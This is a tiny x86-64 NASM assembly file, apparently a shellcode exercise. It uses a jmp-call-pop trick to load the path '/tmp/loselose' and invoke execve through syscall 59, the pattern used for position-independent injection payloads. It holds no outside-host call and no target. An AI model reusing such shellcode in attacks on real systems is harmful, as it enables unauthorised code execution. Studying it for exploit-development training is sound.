; nasm -f elf64 ./shellx86_64_no_conversion.asm -o shellx86_64_no_conversion.o
; ld shellx86_64_no_conversion.o -o shellx86_64_no_conversion

section .text
global _start
_start:
    nop
    nop
    jmp my_string

payload:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    pop rdi
    push 59
    pop rax
    syscall

my_string:
    call payload
    dd "/tmp/loselose"